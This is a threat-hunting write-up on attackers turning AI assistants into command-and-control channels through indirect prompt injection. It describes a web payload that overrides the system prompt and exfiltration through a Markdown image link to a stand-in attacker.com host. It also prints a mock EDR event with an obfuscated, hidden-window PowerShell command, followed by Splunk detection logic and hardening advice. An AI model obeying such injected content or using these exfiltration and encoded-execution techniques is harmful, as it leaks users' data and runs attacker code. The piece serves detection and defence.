# Threat Hunting: AI-as-a-C2 via Indirect Prompt Injection

**Date:** 2026-02-21

**Author:** Enes Arda Baydaş

**Category:** SIEM-Hunting

**Platform:** Independent Research

### Flowchart

````mermaid
flowchart LR

classDef input fill:#4A90D9,color:#fff
classDef process fill:#6B7280,color:#fff
classDef decision fill:#F59E0B,color:#fff
classDef output fill:#10B981,color:#fff

subgraph ATK1[Attack Ingestion]
  payload([Malicious Web Payload])
  rag[AI RAG Ingests Content]
  ipi{System Prompt Overridden}
end

subgraph ATK2[C2 Execution]
  fetch[AI Fetches Attacker Summary]
  parse[Malware Parses Encoded Commands]
  shell[Browser Spawns Shell Process]
end

subgraph EXFIL[Exfiltration]
  collect[Local Data Collected]
  exfil[Markdown Image GET Request]
  c2[[Attacker C2 Receives Data]]
end

subgraph DETECT[Detection and Response]
  edr[EDR Monitors Process Lineage]
  siem[SIEM Correlation Fires]
  alert{Suspicious Activity Detected}
  isolate[[Endpoint Isolated]]
end

payload --> rag --> ipi
ipi -->|yes| fetch
ipi -->|no| edr
fetch --> parse --> shell --> collect --> exfil --> c2
shell --> edr
exfil --> edr
edr --> siem --> alert
alert -->|confirmed| isolate
alert -->|false positive| edr

class payload input
class rag,fetch,parse,shell,collect,exfil,edr,siem process
class ipi,alert decision
class c2,isolate output
````

### 1. Executive Brief

**Scenario:** Proactive threat modeling and SIEM rule development focusing on the weaponization of Artificial Intelligence assistants. Adversaries are actively leveraging Indirect Prompt Injection (IPI) to force trusted LLM environments to act as Command & Control (C2) infrastructure.

**Goal:** Map the theoretical attack lifecycle of AI-driven protocol tunneling and develop EDR/SIEM correlation logic to detect it.

**Business Impact:** Because the C2 traffic originates from trusted AI IP spaces (e.g., OpenAI, Google), it effectively blinds legacy firewalls and IP blacklists. This creates a highly stealthy vector for data exfiltration, bringing catastrophic financial risks and severe KVKK compliance violations regarding the unauthorized exfiltration of sensitive local data.

### 2. The Investigation

**Trigger:** Proactive threat hunting exercise based on emerging AI-based C2 methodologies. 

**Analysis:** This attack circumvents traditional signature-based IDS/IPS by tunneling traffic through standard HTTPS (Port 443) to trusted domains. 

* **MITRE ATT&CK Mapping:**
  * **T1568:** Dynamic Resolution (C2 via AI Proxy)
  * **T1059:** Command and Scripting Interpreter (Local Execution)
  - **T1071.001:** Application Layer Protocol (Web Protocols)
  - **T1567:** Exfiltration Over Web Service

Below is an example of an AI-generated EDR Telemetry mockup showing ``msedge.exe`` spawning ``powershell.exe`` with heavily obfuscated command-line arguments

```
{
  "timestamp": "2026-02-23T14:32:45.123Z",
  "event_type": "Process Creation",
  "sensor_id": "S-12345-ABCDE",  # Specific agent/sensor generated the alert. 
  "device": {
    "hostname": "WORKSTATION-7",
    "os": "Windows 10 Enterprise",
    "domain": "CORP"  # The Active Directory domain the machine belongs to.
  },
  "process": {
    "name": "powershell.exe",
    "pid": 8824,
    "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBIADQAcwBJAEEAAAAA/wAwADEAMgAzADQANQA2ADcAOAA5AGEAYgBjAGQAZQBmAA==';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()", # The executed command. Flags hide the window (-W Hidden), bypass execution policies (-Exec Bypass), and run a Base64 encoded payload (-Enc) which decompresses and executes (IEX) a malicious stream.
    "user": "CORP\\jdoe",
    "integrity_level": "Medium",
    "hashes": {
      "sha256": "D8473820A2D74A33685938207991112598777320846573209847563209847532"
    }
  },
  "parent_process": {
    "name": "msedge.exe",
    "pid": 4120,
    "path": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "command_line": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --profile-directory=Default",
    "user": "CORP\\jdoe",
    "integrity_level": "Medium"
  }
} 
```

**Observation:** 

- The attack sequence reveals an initial payload hidden within public web elements. When ingested by the AI's RAG engine, the system prompt is overridden. 

- The AI fetches an attacker's "summary" containing encoded commands, which local malware parses. For the uplink, stolen data is appended to a generated Markdown image link (e.g., `![data](https://attacker.com/log?data=[ENCODED])`), triggering a GET request to the attacker's server upon rendering.

**Inference:** 

- Attackers are using the LLM environment itself to fetch payloads and exfiltrate data. Defense must pivot from IP-based blocking to behavioral process monitoring and network anomaly correlation.

### 3. Findings & Artifacts (IOCs)

*Note: As this is a behavioral threat model, IOCs are pattern-based rather than static.*

| Indicator Type                        | Details                                                                                          | Context                                                            |
| :------------------------------------ | :----------------------------------------------------------------------------------------------- | :----------------------------------------------------------------- |
| **Suspicious Path / Process Lineage** | `msedge.exe`, `chrome.exe`, or AI Binaries spawning `powershell.exe`, `cmd.exe`, or `python.exe` | EDR anomaly indicating web/AI app is executing shell commands.     |
| **Command Line Syntax**               | Heavily obfuscated or Base64-encoded arguments in child processes                                | Parsing of the C2 downlink.                                        |
| **Network Anomaly**                   | Exceptionally large payload sizes on POST requests to AI API endpoints                           | Indicates potential data staging/exfiltration via CASB/Proxy logs. |
| **Suspicious URL Pattern**            | Markdown image renders pointing to untrusted domains containing base64 parameters                | C2 Uplink / Exfiltration method.                                   |

### 4. Remediation & Hardening

**Detection Logic:** Signature-based detection fails due to the non-deterministic nature of LLMs.
Detection requires correlating endpoint process lineage with network proxy traffic. 

* Monitor EDR for web browsers or AI desktop applications spawning command shells.
* Monitor proxy/CASB logs for unusually high volumes of POST requests to AI API endpoints from a single host.

**SIEM Correlation (Splunk):**

Code below is an AI-generated EXAMPLE  rule.

```spl
index IN (sysmon, proxy) (EventCode=3 Image="ollama.exe") OR (url="api.openai.com")
| eval ip_address = coalesce(SourceIp, src_ip)
| bin _time span=1m
| stats count(eval(index=="sysmon")) as edr_match, count(eval(index=="proxy")) as proxy_match, sum(cs_bytes) as Total_Bytes by ip_address, _time
| where edr_match > 0 AND proxy_match > 0 AND Total_Bytes > 10485760
| table _time, ip_address, Total_Bytes
```

**Immediate Fix:** 

- If correlation logic triggers, immediately isolate the endpoint from the network to halt potential data exfiltration. Block any non-AI third-party domains identified in the markdown rendering process.

**Root Cause Fix:** 

- Implement strict EDR behavioral rules to block web browsers and dedicated AI desktop agents from spawning command-line interpreters (`cmd.exe`, `powershell.exe`). Restrict the local file system access permissions granted to AI agents to limit the scope of potential data gathering. Ensure USOM feeds are integrated to block known malicious endpoints used in the image-rendering exfiltration stage.

### 5. Reflections

- This exercise highlighted that adversaries are constantly innovating, turning our productivity tools into attack infrastructure. 

- I learned that relying solely on network perimeter defenses (like IP blacklists) is insufficient against modern, tunneled threats. 

- Mapping this out reinforced the necessity of defense-in-depth: specifically, the value of cross-correlating endpoint telemetry (process lineage) with network layer activity (proxy logs) to uncover threats that masquerade as legitimate traffic.


A little bit of extra on how the "local malware parses" things:

1) **Pre-staged malware** monitors the AI interface output, parses encoded commands, and calls PowerShell under the Edge process context

2) AI agent with **OS tool permissions** (Copilot/AutoGPT-style) IPI instructs it to invoke its own legitimate execute_command tool directly, no malware needed

3) Malicious **browser extension** intercepts AI responses, detects encoded payloads, and spawns PowerShell via native messaging APIs
